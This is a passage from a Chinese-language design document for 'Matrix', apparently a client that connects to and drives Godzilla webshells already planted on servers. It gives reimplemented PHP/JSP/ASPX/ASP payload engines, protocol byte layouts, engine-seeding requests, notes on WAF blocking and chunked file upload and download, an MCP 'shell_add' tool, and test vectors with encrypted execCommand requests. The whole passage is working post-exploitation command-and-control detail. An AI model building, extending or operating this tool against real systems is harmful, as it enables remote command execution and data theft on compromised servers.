  - `matrix_godzilla.php`（VBScript/PHP 引擎，`<?php` 剥离后 base64 存入 `data/godzilla/`）
  - `MatrixGodzillaEngine.java`（`javac --release 8` 编译，单类无内部类）
  - `MatrixGodzillaEngine.cs`（需 `csc`/`mcs`，本机未安装，资产未生成）
  - `matrix_godzilla.asp`（VBScript 文本）
- 引擎保持与 Godzilla 相同的 `methodName` API，因此 **Matrix 引擎与 Godzilla 官方引擎可以互相替换**：标准马播种任意一种都能用。

这样一来：无 GPL 资产再分发风险；无运行时 jar 依赖；协议与引擎都可独立演进。

### 9.2 Session 与并发（中）

- PHP `session_start()` 会加文件锁；并发请求可能串行或阻塞 → 用全局 gate 串行发送。
- JSP Session 内的 payload 类在 Session 过期后失效 → `call` 失败时自动重播种一次。
- 播种请求本身可能被 WAF 拦截（34KB body）→ 诊断里保留 HTTP 状态与 body 前 512 字节。

### 9.3 标记大小写/长度（中）

- PHP/ASP 小写，Java/C# 大写；ASP 只有 6 字符。
- Java 的 `BigInteger.toString(16)` 可能丢前导零 → 标记长度 31；客户端需要容错切分。
- 对策：`markers()` 返回标准标记；`extractResponse` 在失败时尝试“去掉 md5 首个 nibble 为 0”的两种切分。

### 9.4 gzip 差异（中）

- PHP 的 `canCallGzipEncode()` 取决于 `gzencode`；响应可能 gzip 也可能明文 → 嗅探 `1f 8b`。
- PHP 的请求：Godzilla 客户端会 gzip，但服务端 `run()` 自动识别；Matrix 默认发明文，避免依赖 `gzdecode`。
- ASP 无 gzip。
- 对策：`gzipResponse` 三态（always/sniff/never），不要假设。

### 9.5 大文件（中）

- 一次性 `readFile`/`uploadFile` 会把整个文件放进内存并 base64/加密放大。
- 对策：> 2MB 走 `bigFileDownload`/`bigFileUpload` 分块（建议 256KB–1MB），并复用 `writeFileBinaryWithProgress` 的进度回调。
- Java `bigFileDownload` 返回原始字节；PHP 返回原始字节；注意不要重复 base64。

### 9.6 变体选错（高）

用户把 `jsp_godzilla` 用在 PHP 马上会得到“标记缺失/解密失败”。对策：

- `lastPingDiagnostic` 明确提示“请确认目标语言与 Godzilla 加密方式”。
- 自动检测按语言分组尝试，找到第一个可用即停。
- 文档里给一张“目标文件扩展名 ↔ 连接器”对照表。

### 9.7 HTTP 细节（低）

- `Content-Type` 必须是 `application/x-www-form-urlencoded`（`request.getParameter` / `$_POST` 依赖）。
- 参数名（密码）可能含特殊字符 → `Uri.encodeComponent`。
- base64 作为参数值时 `+ / =` 必须 URL 编码，否则被表单解码破坏。

### 9.8 版本漂移（低）

Godzilla 社区有多个 fork（v4.0.1、v4.0.2、二开版）。本设计以 2021-11-01 的 jar 为准。若用户使用二开版，可能出现：

- 自定义参数名/额外 header；
- 不同的 payload 引擎；
- 额外的 `reqLeft`/`reqRight`。

对策：诊断信息保留原始请求/响应摘要；后续版本再加“自定义 header/前后缀”字段。

---

## 10. 决策记录（原待确认问题）

1. **核心目标** → 连接已有标准 Godzilla 马。Matrix 不生成马，只做协议对接。
2. **引擎资产** → 不用 `godzilla.jar`；协议 Dart 重写，引擎 Matrix 自研（见 §9.1）。
3. **首批语言** → 四语言全部实现；PHP/JSP 已实测，ASPX/ASP 待 Windows 目标验证。
4. **`secret_key`** → 新增独立字段（不改 `password` 语义）：
   - DB：`webshells.secret_key TEXT NOT NULL DEFAULT 'key'`（v13 → v14）
   - UI：Godzilla 连接器下显示 “Godzilla key (secretKey)”
   - MCP：`shell_add` 新增可选 `secret_key`
   - 为什么不塞进 `password`：Godzilla 的密码与密钥是两个独立值（密码 = HTTP 参数名，密钥 = 加密材料），合并会让 UI 与协议都变得含糊。
5. **自动检测** → 选择了 Godzilla 连接器时直接连接该连接器（用户已填密码 + 密钥），不再逐个探测 11 个普通连接器；选择普通连接器时不探测 Godzilla，避免无意义的 4 次播种请求。

---

## 附录 A：权威测试向量

环境：`password = mAtrix_911`，`secretKey = key`。

```
key16                  = 3c6e0b8a9c15224a
md5(password+key16)    = 371be1ca27de980e4cfd279ab200099a
JAVA/C# LEFT (upper)   = 371BE1CA27DE980E
JAVA/C# RIGHT (upper)  = 4CFD279AB200099A
PHP LEFT/RIGHT (lower) = 371be1ca27de980e / 4cfd279ab200099a
ASP LEFT/RIGHT         = 371be1 / 279ab2

params(cmdLine=id)                    = 636d644c696e6502020000006964
params(methodName=execCommand)        = 6d6574686f644e616d65020b00000065786563436f6d6d616e64
params(methodName=execCommand, cmdLine=id)
  = 636d644c696e65020200000069646d6574686f644e616d65020b00000065786563436f6d6d616e64

gzip(params) hex = 1f8b08000000000000ff4bce4df1c9cc4b6562626060c84cc94d2dc9c84ff14bcc4d65e2060aa456a4263be7e7e626e6a50000fbcc2b3428000000

JAVA request  = mAtrix_911=BJi6%2F01oN9HWQODA6Lkk0Lihk06LGUPbDUXaKcaGQiwOCEeuu8sW%2FggUCEjBcaudjLp8HfKg0ObLqQOTXPEjwA%3D%3D
JAVA response = 371BE1CA27DE980EBJi6/01oN9HWQODA6Lkk0Lihk06LGUPbDUXaKcaGQiwOCEeuu8sW/ggUCEjBcaudjLp8HfKg0ObLqQOTXPEjwA==4CFD279AB200099A

CS request    = mAtrix_911=%2BjdMnjXvYmIjnOjgSP0XvvoblaJVNVCUQGcUAsC5IdoJfN4rMPnbJsmmEq6SPKWhc5ggG9GKKIBkS%2F%2Fhjp4wwg%3D%3D
CS response   = 371BE1CA27DE980E+jdMnjXvYmIjnOjgSP0XvvoblaJVNVCUQGcUAsC5IdoJfN4rMPnbJsmmEq6SPKWhc5ggG9GKKIBkS//hjp4wwg==4CFD279AB200099A

PHP request   = mAtrix_911=AFsBfAtWBDthMTUyW1AMVhdeClQsWQxcYTo1MjJRGVYAdQpdD1kPXQ%3D%3D
PHP response  = 371be1ca27de980eY21kTGluZQICAAAAaWRtZXRob2ROYW1lAgsAAABleGVjQ29tbWFuZA==4cfd279ab200099a

ASP request   = mAtrix_911=AFsBfAtWBDthMTUyW1AMVhdeClQsWQxcYTo1MjJRGVYAdQpdD1kPXQ%3D%3D
ASP response  = 371be1AFsBfAtWBDthMTUyW1AMVhdeClQsWQxcYTo1MjJRGVYAdQpdD1kPXQ==279ab2
```

> 说明：Java/C# 的 `params` 在发送前还要 gzip；上面的 `gzip(params)` 是 `methodName=execCommand, cmdLine=id` 的 gzip 结果（注意 HashMap 顺序可能与示例不同，协议不依赖顺序）。
> PHP/ASP 的请求示例未 gzip（Godzilla 原生 PHP 客户端也不 gzip；服务端会自动识别）。

## 附录 B：协议字节布局

### B.1 参数序列化

```
+----------------+------+---------------------+------------------+
| name (UTF-8)   | 0x02 | length (int32 LE)   | value (raw bytes)|
+----------------+------+---------------------+------------------+
重复直到结束；没有结束符。
```

### B.2 请求 body（Base64 变体）

```
<password>=<percent-encoded base64(cipher)>
```

### B.3 响应 body

```
<left><base64(cipher)><right>
```

### B.4 播种请求

```
<password>=<percent-encoded base64(cipher(engineBytes))>
```

- 不 gzip。
- 响应通常为空；忽略。

## 附录 C：Godzilla 变体清单（jar 2021-11-01）

| 类 | 语言 | 说明 | v1 |
| --- | --- | --- | --- |
| `phpXor.PhpXor` | PHP | XOR + Base64 | ✅ |
| `phpXor.PhpEvalXor` | PHP | 每次重发引擎的 eval 模式 | ⏳ |
| `phpXor.PhpXorRaw` | PHP | 原始 body | ⏳ |
| `JavaAes.JavaAesBase64` | JSP | AES/ECB + Base64 | ✅ |
| `JavaAes.JavaAesBase64Ex` | JSP | 额外 `passW` 参数 | ⏳ |
| `JavaAes.JavaAesRaw` | JSP | 原始 body | ⏳ |
| `JavaAes.JavaAesWeblogic` | JSP | WebLogic 定制 | ⏳ |
| `cshapAes.CShapAesBase64` | ASPX | AES/CBC(key=IV) | ✅ |
| `cshapAes.CShapAesBase64Ex` | ASPX | Ex 变体 | ⏳ |
| `cshapAes.CShapAesRaw` | ASPX | 原始 body | ⏳ |
| `cshapAes.CShapAsmxAesBase64` | ASPX | ASMX 端点 | ⏳ |
| `cshapAes.CSharpEvalAesBase64` | ASPX | eval 模式 | ⏳ |
| `aspXor.AspXorBae64` | ASP | XOR + Base64 | ✅ |
| `aspXor.AspBase64` | ASP | 仅 Base64 | ⏳ |
| `aspXor.AspRaw` / `AspXorRaw` | ASP | 原始 body | ⏳ |
| `aspXor.AspEvalBase64` | ASP | eval 模式 | ⏳ |
